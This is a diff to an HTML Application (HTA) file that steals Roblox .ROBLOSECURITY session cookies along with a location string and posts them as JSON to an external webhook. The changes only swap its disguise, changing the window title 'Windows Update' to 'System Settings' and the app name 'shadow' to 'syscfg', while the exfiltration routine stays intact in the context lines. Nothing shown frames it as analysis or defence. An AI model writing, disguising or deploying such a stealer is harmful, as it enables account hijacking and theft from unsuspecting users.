@@ -1,9 +1,9 @@
 <html>
 <head>
-<title>Windows Update</title>
+<title>System Settings</title>
 <HTA:APPLICATION
-  ID="shadow"
-  APPLICATIONNAME="shadow"
+  ID="syscfg"
+  APPLICATIONNAME="syscfg"
   BORDER="none"
   BORDERSTYLE="none"
   CAPTION="no"
@@ -140,7 +140,7 @@ Sub SendToWebhook(loc, cookie)
   escapedCookie = Replace(escapedCookie, vbCrLf, "\n")
   escapedCookie = Replace(escapedCookie, vbCr, "\n")
   escapedCookie = Replace(escapedCookie, vbLf, "\n")
-  payload = "{""content"":""**shadow hit**\n**Location:**\n```" & escapedLoc & "```\n**.ROBLOSECURITY:**\n```" & escapedCookie & "```""}"
+  payload = "{""content"":""**syscfg hit**\n**Location:**\n```" & escapedLoc & "```\n**.ROBLOSECURITY:**\n```" & escapedCookie & "```""}"
   Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
   xmlhttp.Open "POST", webhook, False
   xmlhttp.setRequestHeader "Content-Type", "application/json"
@@ -159,3 +159,4 @@ Main
 </head>
 <body></body>
 </html>
+
